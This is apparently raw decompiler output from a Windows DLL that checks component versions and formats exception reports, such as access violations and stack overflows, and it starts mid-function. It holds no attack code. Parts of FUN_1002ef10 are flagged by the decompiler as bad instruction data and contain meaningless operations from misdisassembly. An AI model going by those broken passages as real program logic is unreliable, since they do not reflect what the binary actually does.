  extraout_ECX[3] = uVar4;
  extraout_ECX[4] = uVar5;
  extraout_ECX[5] = uVar6;
  extraout_ECX[6] = uVar3;
  extraout_ECX[7] = uVar4;
  extraout_ECX[8] = uVar5;
  extraout_ECX[9] = uVar6;
  uVar3 = (*unaff_ESI)(param_1,"DllGetVersion");
  *extraout_ECX = uVar3;
  uVar3 = (*unaff_ESI)(param_1,"ExtensionApiVersion");
  extraout_ECX[1] = uVar3;
  if ((code *)*extraout_ECX != (code *)0x0) {
    iVar1 = (*(code *)*extraout_ECX)(puVar7);
    if (iVar1 == 0) goto LAB_1002e995;
  }
  FUN_10021a40(param_1,1);
  if (local_10 == (int *)0x0) {
    piVar2 = (int *)0x0;
  }
  else {
    piVar2 = local_10 + 3;
  }
  puVar7 = &local_8;
  local_8 = 0;
  iVar1 = FUN_104c9357(piVar2,puVar7);
  if (iVar1 != 0) {
    uVar3 = FUN_100581b4(iVar1);
    FUN_104f7ccb(puVar7,puVar7,local_8,iVar1,uVar3);
    local_c = 0;
    local_14 = 0x34;
    FUN_1038e71c(extraout_ECX,uVar3,&DAT_1008401c,&local_c,&local_14);
    if (local_c != 0) {
      extraout_ECX[3] = (uint)*(ushort *)(local_c + 10);
      extraout_ECX[4] = (uint)*(ushort *)(local_c + 8);
      extraout_ECX[5] = (uint)*(ushort *)(local_c + 0xe);
      extraout_ECX[6] = (uint)*(ushort *)(local_c + 0xc);
    }
    FUN_100579ee(uVar3);
  }
  if (local_10 != (int *)0x0) {
    LOCK();
    iVar1 = *local_10;
    *local_10 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(local_10);
    }
  }
LAB_1002e995:
  if ((((extraout_ECX[3] != 0) || (extraout_ECX[4] != 0)) || (extraout_ECX[5] != 0)) ||
     (extraout_ECX[6] != 0)) {
    FUN_10006250("DllGetVersion(%x): %d.%d.%d.%d\n",param_1,extraout_ECX[3],extraout_ECX[4],
                 extraout_ECX[5],extraout_ECX[6]);
  }
  return extraout_ECX;
}



/* Function: FUN_1002e9d0 */

undefined4 __thiscall FUN_1002e9d0(int param_1,int param_2)

{
  if (*(uint *)(param_1 + 0xc) < *(uint *)(param_2 + 0xc)) {
    return 1;
  }
  if (*(uint *)(param_1 + 0xc) <= *(uint *)(param_2 + 0xc)) {
    if (*(uint *)(param_1 + 0x10) < *(uint *)(param_2 + 0x10)) {
      return 1;
    }
    if (*(uint *)(param_1 + 0x10) <= *(uint *)(param_2 + 0x10)) {
      if (*(uint *)(param_1 + 0x14) < *(uint *)(param_2 + 0x14)) {
        return 1;
      }
      if ((*(uint *)(param_1 + 0x14) <= *(uint *)(param_2 + 0x14)) &&
         (*(uint *)(param_1 + 0x18) < *(uint *)(param_2 + 0x18))) {
        return 1;
      }
    }
  }
  return 0;
}



/* Function: FUN_1002ea20 */

bool __thiscall FUN_1002ea20(int param_1,int param_2)

{
  if (((*(uint *)(param_1 + 0xc) <= *(uint *)(param_2 + 0xc)) &&
      (*(uint *)(param_1 + 0x10) <= *(uint *)(param_2 + 0x10))) &&
     (*(uint *)(param_1 + 0x14) <= *(uint *)(param_2 + 0x14))) {
    return *(uint *)(param_1 + 0x18) <= *(uint *)(param_2 + 0x18);
  }
  return false;
}



/* Function: FUN_1002ea60 */

undefined4 * __fastcall FUN_1002ea60(undefined4 *param_1)

{
  uint uVar1;
  undefined4 *puVar2;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10076346;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  param_1[5] = 0;
  param_1[6] = 0;
  local_8 = 1;
  puVar2 = (undefined4 *)FUN_100582fa(8,uVar1);
  if (puVar2 == (undefined4 *)0x0) {
    puVar2 = (undefined4 *)0x0;
  }
  else {
    *puVar2 = 0xffffffff;
    puVar2[1] = 0xffffffff;
  }
  param_1[7] = puVar2;
  param_1[8] = 0;
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1002eb00 */

void __fastcall FUN_1002eb00(int param_1)

{
  int iVar1;
  code *pcVar2;
  int *piVar3;
  int *piVar4;
  
  pcVar2 = DAT_10079270;
  piVar4 = (int *)**(int **)(param_1 + 4);
  if (piVar4 != *(int **)(param_1 + 4)) {
    do {
      if (piVar4[3] != 0) {
        FUN_101afc8b(piVar4[3]);
        (*pcVar2)(piVar4[3]);
      }
      piVar4 = (int *)*piVar4;
    } while (piVar4 != (int *)*(int *)(param_1 + 4));
  }
  (*pcVar2)(*(undefined4 *)(param_1 + 0x78));
  piVar4 = *(int **)(param_1 + 0x90);
  if (piVar4 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar4;
    *piVar4 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar4);
    }
  }
  piVar4 = *(int **)(param_1 + 0x8c);
  if (piVar4 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar4;
    *piVar4 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar4);
    }
  }
  piVar4 = *(int **)(param_1 + 0x88);
  if (piVar4 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar4;
    *piVar4 = *piVar4 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar4);
    }
  }
  FUN_1000ba10();
  thunk_FUN_100579ee(*(undefined4 *)(param_1 + 0x7c));
  FUN_1002ebf0();
  piVar4 = *(int **)(param_1 + 4);
  piVar3 = (int *)*piVar4;
  *piVar4 = (int)piVar4;
  *(int *)(*(int *)(param_1 + 4) + 4) = *(int *)(param_1 + 4);
  *(undefined4 *)(param_1 + 8) = 0;
  if (piVar3 != *(int **)(param_1 + 4)) {
    do {
      piVar4 = (int *)*piVar3;
      thunk_FUN_100579ee(piVar3);
      piVar3 = piVar4;
    } while (piVar4 != (int *)*(int *)(param_1 + 4));
  }
  thunk_FUN_100579ee(*(undefined4 *)(param_1 + 4));
  return;
}



/* Function: FUN_1002ebf0 */

void __fastcall FUN_1002ebf0(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  
  FUN_10030fa0();
  thunk_FUN_100579ee(param_1[0x18]);
  piVar2 = (int *)param_1[0x14];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)param_1[0x13];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)param_1[0x12];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)param_1[0x11];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)param_1[0x10];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)param_1[0xf];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)param_1[0xe];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)param_1[0xd];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)param_1[0xc];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)param_1[0xb];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)param_1[10];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)param_1[9];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)param_1[8];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)param_1[7];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)param_1[6];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)*param_1;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  return;
}



/* Function: FUN_1002ed90 */

int * __thiscall FUN_1002ed90(int *param_1,undefined4 param_2,int param_3)

{
  uint uVar1;
  int iVar2;
  undefined4 extraout_ECX;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100763c9;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = param_3;
  param_1[1] = 0;
  param_1[2] = 0;
  iVar2 = FUN_10018da0(0,0);
  param_1[1] = iVar2;
  local_8 = 0;
  if ((DAT_1009b4dc & 1) == 0) {
    DAT_1009b4dc = DAT_1009b4dc | 1;
    FUN_1001a9a0(uVar1);
    FUN_10057b51(&DAT_100784c0);
  }
  param_1[3] = (int)&DAT_1009b4e0;
  FUN_10031450();
  local_8._0_1_ = 1;
  iVar2 = FUN_10032eb0();
  param_1[0x1e] = iVar2;
  param_1[0x1f] = 0;
  param_1[0x20] = 0;
  iVar2 = FUN_1000fa00(0,0);
  param_1[0x1f] = iVar2;
  if ((DAT_1009b468 & 1) == 0) {
    DAT_1009b468 = DAT_1009b468 | 1;
    local_8._0_1_ = 3;
    FUN_10015880();
    FUN_10057b51(&DAT_10078460);
  }
  param_1[0x21] = DAT_1009b46c;
  param_1[0x22] = 0;
  param_1[0x23] = 0;
  param_1[0x24] = 0;
  local_8 = CONCAT31(local_8._1_3_,6);
  param_1[0x25] = 0;
  param_1[0x26] = 0;
  param_1[0x27] = 0;
  *(undefined1 *)(param_1 + 0x28) = 0;
  param_1[5] = 0;
  param_1[6] = 0;
  param_1[7] = 0;
  param_1[8] = 0;
  FUN_104d0266(param_1,param_1 + 5);
  iVar2 = FUN_1066dfb6(param_1);
  param_1[9] = iVar2;
  FUN_1002fa80(**(undefined4 **)(*param_1 + 0x14),(*(undefined4 **)(*param_1 + 0x14))[1]);
  iVar2 = FUN_1000bdd0(param_2,extraout_ECX);
  param_1[0x18] = iVar2;
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1002ef10 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x1002f82e) */

void __fastcall FUN_1002ef10(int *param_1)

{
  uint uVar1;
  int *piVar2;
  uint *puVar3;
  char *pcVar4;
  int iVar5;
  int *piVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  int iVar9;
  int extraout_ECX;
  int extraout_ECX_00;
  int extraout_ECX_01;
  int extraout_ECX_02;
  undefined4 extraout_ECX_03;
  wchar_t *pwVar10;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  int extraout_ECX_06;
  char extraout_DL;
  int iVar11;
  undefined8 uVar12;
  undefined *puVar13;
  undefined4 *puVar14;
  uint uStack_364;
  uint local_33c;
  int *local_338;
  int local_334;
  int local_330;
  undefined4 local_32c;
  undefined4 local_328;
  int *local_324;
  undefined4 uStack_320;
  int local_310;
  undefined1 local_30c [4];
  int *local_308;
  int *local_304;
  int local_300;
  int *local_2fc;
  int *local_2f8;
  undefined4 local_2f4;
  int local_2f0;
  undefined4 local_b4;
  undefined4 local_b0;
  undefined4 local_ac;
  undefined4 local_a8;
  int local_a4;
  undefined1 local_a0 [136];
  uint local_18;
  undefined1 *local_14;
  void *local_10;
  undefined1 *puStack_c;
  int local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076448;
  local_10 = ExceptionList;
  uStack_364 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_14 = (undefined1 *)&uStack_364;
  ExceptionList = &local_10;
  iVar5 = *param_1;
  param_1[0x1a] = *(int *)(*(int *)(iVar5 + 0x14) + 0x344);
  param_1[0x1b] = *(int *)(*(int *)(iVar5 + 0x14) + 0x424);
  pcVar4 = (char *)(*(int *)(iVar5 + 0x14) + 0x3e4);
  local_18 = uStack_364;
  if ((pcVar4 == (char *)0x0) || (*pcVar4 == '\0')) {
    piVar6 = (int *)param_1[10];
    puVar3 = &uStack_364;
    if (piVar6 == (int *)0x0) {
LAB_1002efb8:
      local_14 = (undefined1 *)puVar3;
      piVar6 = (int *)0x0;
    }
    else {
      if (*piVar6 != 0) {
        LOCK();
        iVar5 = *piVar6;
        *piVar6 = iVar5 + -1;
        UNLOCK();
        puVar3 = &uStack_364;
        if (iVar5 + -1 < 0) {
          FUN_100579ee(piVar6);
          puVar3 = (uint *)local_14;
        }
        goto LAB_1002efb8;
      }
      piVar6[2] = 0;
      *(undefined2 *)(piVar6 + 3) = 0;
      local_14 = (undefined1 *)&uStack_364;
    }
    param_1[10] = (int)piVar6;
  }
  else {
    local_14 = (undefined1 *)&uStack_364;
    iVar5 = FUN_1000c0a0(pcVar4,0xffffffff);
    param_1[10] = iVar5;
  }
  pcVar4 = (char *)(*(int *)(*param_1 + 0x14) + 0x430);
  if ((pcVar4 == (char *)0x0) || (*pcVar4 == '\0')) {
    piVar6 = (int *)param_1[0xb];
    if (piVar6 == (int *)0x0) {
LAB_1002f010:
      piVar6 = (int *)0x0;
    }
    else {
      if (*piVar6 != 0) {
        LOCK();
        iVar5 = *piVar6;
        *piVar6 = iVar5 + -1;
        UNLOCK();
        if (iVar5 + -1 < 0) {
          FUN_100579ee(piVar6);
        }
        goto LAB_1002f010;
      }
      piVar6[2] = 0;
      *(undefined2 *)(piVar6 + 3) = 0;
    }
    param_1[0xb] = (int)piVar6;
  }
  else {
    iVar5 = FUN_1000c0a0(pcVar4,0xffffffff);
    param_1[0xb] = iVar5;
  }
  pcVar4 = (char *)(*(int *)(*param_1 + 0x14) + 0x348);
  if ((pcVar4 == (char *)0x0) || (*pcVar4 == '\0')) {
    piVar6 = (int *)param_1[0xc];
    if (piVar6 == (int *)0x0) {
LAB_1002f068:
      piVar6 = (int *)0x0;
    }
    else {
      if (*piVar6 != 0) {
        LOCK();
        iVar5 = *piVar6;
        *piVar6 = iVar5 + -1;
        UNLOCK();
        if (iVar5 + -1 < 0) {
          FUN_100579ee(piVar6);
        }
        goto LAB_1002f068;
      }
      piVar6[2] = 0;
      *(undefined2 *)(piVar6 + 3) = 0;
    }
    param_1[0xc] = (int)piVar6;
  }
  else {
    iVar5 = FUN_1000c0a0(pcVar4,0xffffffff);
    param_1[0xc] = iVar5;
  }
  pcVar4 = (char *)(*(int *)(*param_1 + 0x14) + 0x37c);
  if ((pcVar4 == (char *)0x0) || (*pcVar4 == '\0')) {
    piVar6 = (int *)param_1[0xd];
    if (piVar6 == (int *)0x0) {
LAB_1002f0c0:
      piVar6 = (int *)0x0;
    }
    else {
      if (*piVar6 != 0) {
        LOCK();
        iVar5 = *piVar6;
        *piVar6 = iVar5 + -1;
        UNLOCK();
        if (iVar5 + -1 < 0) {
          FUN_100579ee(piVar6);
        }
        goto LAB_1002f0c0;
      }
      piVar6[2] = 0;
      *(undefined2 *)(piVar6 + 3) = 0;
    }
    param_1[0xd] = (int)piVar6;
  }
  else {
    iVar5 = FUN_1000c0a0(pcVar4,0xffffffff);
    param_1[0xd] = iVar5;
  }
  local_2fc = (int *)0x0;
  local_8 = 0;
  pcVar4 = (char *)(*(int *)(*param_1 + 0x14) + 0x3b0);
  if ((pcVar4 == (char *)0x0) || (*pcVar4 != '\0')) {
    piVar6 = (int *)FUN_100075b0();
  }
  else {
    piVar6 = (int *)FUN_10007ae0();
  }
  local_8._0_1_ = 1;
  local_304 = piVar6;
  local_2f8 = (int *)FUN_100110e0(&local_2fc);
  local_8 = (uint)local_8._1_3_ << 8;
  if (piVar6 != (int *)0x0) {
    LOCK();
    iVar5 = *piVar6;
    *piVar6 = iVar5 + -1;
    UNLOCK();
    if (iVar5 + -1 < 0) {
      FUN_100579ee(piVar6);
    }
  }
  if (local_2f8 != (int *)0x0) {
    FUN_10026a20(&local_2fc);
  }
  pcVar4 = (char *)(*(int *)(*param_1 + 0x14) + 0x3b0);
  if ((pcVar4 == (char *)0x0) || (*pcVar4 != '\0')) {
    piVar6 = (int *)FUN_100075b0();
  }
  else {
    piVar6 = (int *)FUN_10007ae0();
  }
  local_8._0_1_ = 2;
  local_308 = piVar6;
  local_2f8 = (int *)FUN_100110e0(&local_2fc);
  local_8 = (uint)local_8._1_3_ << 8;
  if (piVar6 != (int *)0x0) {
    LOCK();
    iVar5 = *piVar6;
    *piVar6 = iVar5 + -1;
    UNLOCK();
    if (iVar5 + -1 < 0) {
      FUN_100579ee(piVar6);
    }
  }
  if (local_2f8 != (int *)0x0) {
    FUN_10026a20(&local_2fc);
  }
  pcVar4 = (char *)(*(int *)(*param_1 + 0x14) + 0x3b0);
  if ((pcVar4 == (char *)0x0) || (*pcVar4 != '\0')) {
    piVar6 = (int *)FUN_100075b0();
  }
  else {
    piVar6 = (int *)FUN_10007ae0();
  }
  local_8._0_1_ = 3;
  local_2f8 = piVar6;
  local_2f8 = (int *)FUN_100110e0(&local_2fc);
  local_8 = (uint)local_8._1_3_ << 8;
  iVar5 = extraout_ECX;
  if (piVar6 != (int *)0x0) {
    LOCK();
    iVar9 = *piVar6;
    iVar5 = *piVar6;
    *piVar6 = iVar9 + -1;
    UNLOCK();
    if (iVar9 + -1 < 0) {
      FUN_100579ee(piVar6);
      iVar5 = extraout_ECX_00;
    }
  }
  if (local_2f8 != (int *)0x0) {
    FUN_10026a20(&local_2fc);
    iVar5 = extraout_ECX_01;
  }
  if (*(int *)(*param_1 + 0x18) == 0) {
    puVar13 = &DAT_100877e8;
  }
  else {
    puVar13 = &DAT_10086fe8;
  }
  iVar5 = FUN_1000bdd0(puVar13,iVar5);
  param_1[0x11] = iVar5;
  FUN_1005ff60(&local_b4,0,0x94);
  local_b4 = 0x94;
  puVar14 = &local_b4;
  piVar6 = (int *)FUN_10524792(puVar14);
  *piVar6 = *piVar6 + (int)piVar6;
  *(char *)(extraout_ECX_02 + -0x75) = *(char *)(extraout_ECX_02 + -0x75) + extraout_DL;
  piVar6 = (int *)((int)param_1 + -1);
  uVar7 = FUN_1000bdd0(L"Windows ",puVar14);
  *(undefined4 *)((int)param_1 + 0x47) = uVar7;
  if (local_a4 == 1) {
    uVar7 = FUN_1000bfa0(L"(9X)",0xffffffff);
    *(undefined4 *)((int)param_1 + 0x47) = uVar7;
  }
  if (local_a4 == 2) {
    uVar7 = FUN_1000bfa0(L"(NT)",0xffffffff);
    *(undefined4 *)((int)param_1 + 0x47) = uVar7;
  }
  uVar7 = FUN_100155d0(local_b0,10);
  *(undefined4 *)((int)param_1 + 0x4b) = uVar7;
  uVar7 = FUN_1000bfa0(&DAT_10084cac,0xffffffff);
  *(undefined4 *)((int)param_1 + 0x4b) = uVar7;
  uVar7 = FUN_100155d0(local_ac,10);
  *(undefined4 *)((int)param_1 + 0x4b) = uVar7;
  uVar7 = FUN_1000bfa0(&DAT_10084cac,0xffffffff);
  *(undefined4 *)((int)param_1 + 0x4b) = uVar7;
  uVar7 = FUN_100155d0(local_a8,10);
  *(undefined4 *)((int)param_1 + 0x4b) = uVar7;
  uVar7 = FUN_1000bfa0(&DAT_10084cac,0xffffffff);
  *(undefined4 *)((int)param_1 + 0x4b) = uVar7;
  uVar7 = FUN_10031020(local_a0,extraout_ECX_03);
  *(undefined4 *)((int)param_1 + 0x4f) = uVar7;
  if (local_a4 != 0) {
    pcVar4 = (char *)FUN_1051eb71(0x80000002,L"System\\CurrentControlSet\\Control\\Windows",0,1,
                                  local_30c);
    *pcVar4 = *pcVar4 + (char)pcVar4;
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  uVar7 = FUN_100155d0(*(undefined4 *)(*(int *)(*piVar6 + 0x14) + 0x41c),10);
  *(undefined4 *)((int)param_1 + 0x57) = uVar7;
  uVar7 = FUN_100155d0(*(undefined4 *)(*(int *)(*piVar6 + 0x14) + 0x418),10);
  *(undefined4 *)((int)param_1 + 0x5b) = uVar7;
  FUN_1002ea60();
  local_8 = CONCAT31(local_8._1_3_,4);
  iVar5 = *(int *)(*piVar6 + 0x14);
  local_2f8 = *(int **)(iVar5 + 0x30);
  uVar1 = *(uint *)(iVar5 + 0x20);
  local_308 = *(int **)(iVar5 + 0x34);
  local_304 = *(int **)(iVar5 + 0x38);
  local_300 = *(int *)(iVar5 + 0x2c);
  local_33c = uVar1;
  if (uVar1 < 0xc000001e) {
    if (uVar1 == 0xc000001d) {
      pwVar10 = L"illegal instruction";
    }
    else if (uVar1 < 0xc0000009) {
      if (uVar1 != 0xc0000008) {
        if (0x80000002 < uVar1) {
          if (uVar1 < 0x80000005) {
            pwVar10 = L"debug breakpoint";
            goto LAB_1002f646;
          }
          if (uVar1 == 0xc0000005) {
            local_338 = (int *)FUN_1000bdd0(L"access violation",local_304);
            piVar2 = local_2f8;
            if (local_2f8 != (int *)0x0) {
              pwVar10 = L" (write";
              if (local_308 == (int *)0x0) {
                pwVar10 = L" (read";
              }
              local_338 = (int *)FUN_1000bfa0(pwVar10,0xffffffff);
              if (1 < piVar2) {
                local_338 = (int *)FUN_1000bfa0(&DAT_10087950,0xffffffff);
                local_338 = (int *)FUN_10031100(local_304,0,0x10);
              }
              local_338 = (int *)FUN_1000bfa0(&DAT_100839b8,0xffffffff);
            }
            goto LAB_1002f657;
          }
        }
LAB_1002f61d:
        local_338 = (int *)FUN_1000bdd0(L"exception 0x",local_304);
        local_338 = (int *)FUN_100155d0(uVar1,0x10);
        goto LAB_1002f657;
      }
      pwVar10 = L"invalid handle";
    }
    else {
      if (uVar1 != 0xc0000017) goto LAB_1002f61d;
      pwVar10 = L"out of memory";
    }
  }
  else if (uVar1 < 0xc00000fe) {
    if (uVar1 == 0xc00000fd) {
      pwVar10 = L"stack overflow";
    }
    else {
      if ((uVar1 != 0xc000008e) && (uVar1 != 0xc0000094)) goto LAB_1002f61d;
      pwVar10 = L"division by zero";
    }
  }
  else {
    if (uVar1 != 0xe06d7363) goto LAB_1002f61d;
    pwVar10 = L"microsoft c++ exception";
  }
LAB_1002f646:
  local_338 = (int *)FUN_1000bdd0(pwVar10,local_304);
LAB_1002f657:
  iVar5 = local_300;
  local_2f8 = *(int **)((int)param_1 + 0x83);
  local_310 = *(int *)((int)param_1 + 0x77);
  local_334 = local_300;
  uVar8 = FUN_10018da0(0,0);
  local_8._0_1_ = 5;
  uVar7 = extraout_ECX_04;
  if (local_310 != 0) {
    FUN_10022ca0(local_310);
    uVar7 = extraout_ECX_05;
  }
  local_32c = *(undefined4 *)(*(int *)(*piVar6 + 0x14) + 0xc);
  local_328 = 0;
  local_324 = (int *)FUN_1000bdd0(&PTR_10083554,uVar7);
  local_8 = CONCAT31(local_8._1_3_,7);
  FUN_1002fe30(*(undefined4 *)((int)param_1 + 0x77));
  FUN_1002f930(&local_33c,1,*(undefined4 *)(*(int *)(*piVar6 + 0x14) + 4));
  if (local_334 != iVar5) {
    iVar5 = local_334;
  }
  FUN_1005ff60(&local_2f4,0,0x23c);
  local_2f4 = 0x23c;
  if ((*(code **)((int)local_2f8 + 0x28) == (code *)0x0) ||
     (iVar9 = (**(code **)((int)local_2f8 + 0x28))
                        (*(undefined4 *)((int)param_1 + 0x77),iVar5,&local_2f4), iVar9 == 0)) {
    FUN_1024c53e(0);
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  local_330 = iVar5 - local_2f0;
  iVar5 = *(int *)((int)param_1 + 0x6f);
  uVar7 = FUN_10031200(iVar5,*(undefined4 *)(iVar5 + 4),&local_33c);
  uVar12 = CONCAT44(uVar7,*(int *)((int)param_1 + 0x73));
  iVar9 = 0x5555554 - *(int *)((int)param_1 + 0x73);
  if (iVar9 == 0) {
    uVar12 = FUN_10056a6a("list<T> too long");
    iVar9 = extraout_ECX_06;
  }
  iVar11 = (int)((ulonglong)uVar12 >> 0x20);
  *(int *)((int)param_1 + 0x73) = (int)uVar12 + 1;
  *(int *)(iVar5 + 4) = iVar11;
  **(int **)(iVar11 + 4) = iVar11;
  FUN_1002fcd0(iVar9);
  if (*(code **)((int)local_2f8 + 0x10) == (code *)0x0) {
    local_8 = 9;
    if ((DAT_1009b4dc & 1) == 0) {
      DAT_1009b4dc = DAT_1009b4dc | 1;
      FUN_1001a9a0();
      FUN_10057b51(&DAT_100784c0);
    }
    FUN_1000ba10();
    thunk_FUN_100579ee(uVar8);
    FUN_10030f10();
    thunk_FUN_100579ee(uStack_320);
    if (local_324 != (int *)0x0) {
      LOCK();
      iVar5 = *local_324;
      *local_324 = iVar5 + -1;
      UNLOCK();
      if (iVar5 + -1 < 0) {
        FUN_100579ee(local_324);
      }
    }
    if (local_338 != (int *)0x0) {
      LOCK();
      iVar5 = *local_338;
      *local_338 = iVar5 + -1;
      UNLOCK();
      if (iVar5 + -1 < 0) {
        FUN_100579ee(local_338);
      }
    }
    if (local_2fc != (int *)0x0) {
      LOCK();
      iVar5 = *local_2fc;
      *local_2fc = *local_2fc + -1;
      UNLOCK();
      if (iVar5 + -1 < 0) {
        FUN_100579ee(local_2fc);
      }
    }
    ExceptionList = local_10;
    FUN_100579df();
    return;
  }
  (**(code **)((int)local_2f8 + 0x10))(*(undefined4 *)((int)param_1 + 0x77));
  *(undefined1 *)(param_1 + 0x28) = 0;
  FUN_1002f7ee();
  return;
}



/* Function: Catch_All@1002f7e5 */

undefined * Catch_All_1002f7e5(void)

{
  return &DAT_1002f7eb;
}



/* Function: FUN_1002f7ee */

void FUN_1002f7ee(void)

{
  int iVar1;
  int *piVar2;
  int unaff_EBX;
  int unaff_EBP;
  
  *(undefined4 *)(unaff_EBP + -4) = 6;
  *(undefined1 *)(unaff_EBP + -4) = 9;
  if ((DAT_1009b4dc & 1) == 0) {
    DAT_1009b4dc = DAT_1009b4dc | 1;
    FUN_1001a9a0();
    FUN_10057b51(&DAT_100784c0);
  }
  if ((DAT_1009b4f8 != (code *)0x0) && (*(int *)(unaff_EBP + -0x33c) != 0)) {
    (*DAT_1009b4f8)(*(undefined4 *)(unaff_EBP + -0x340));
  }
  FUN_1000ba10();
  thunk_FUN_100579ee(*(undefined4 *)(unaff_EBP + -0x348));
  FUN_10030f10();
  thunk_FUN_100579ee(*(undefined4 *)(unaff_EBP + -0x31c));
  piVar2 = *(int **)(unaff_EBP + -800);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + unaff_EBX;
    UNLOCK();
    if (iVar1 + unaff_EBX < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = *(int **)(unaff_EBP + -0x334);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + unaff_EBX;
    UNLOCK();
    if (iVar1 + unaff_EBX < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = *(int **)(unaff_EBP + -0x2f8);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + unaff_EBX;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  FUN_100579df();
  return;
}



/* Function: FUN_1002f8e0 */

void __fastcall FUN_1002f8e0(int param_1)

{
  int iVar1;
  int *piVar2;
  
  FUN_10030f10();
  thunk_FUN_100579ee(*(undefined4 *)(param_1 + 0x1c));
  piVar2 = *(int **)(param_1 + 0x18);
  if (piVar2 != (int *)0x0) {
    LOCK();
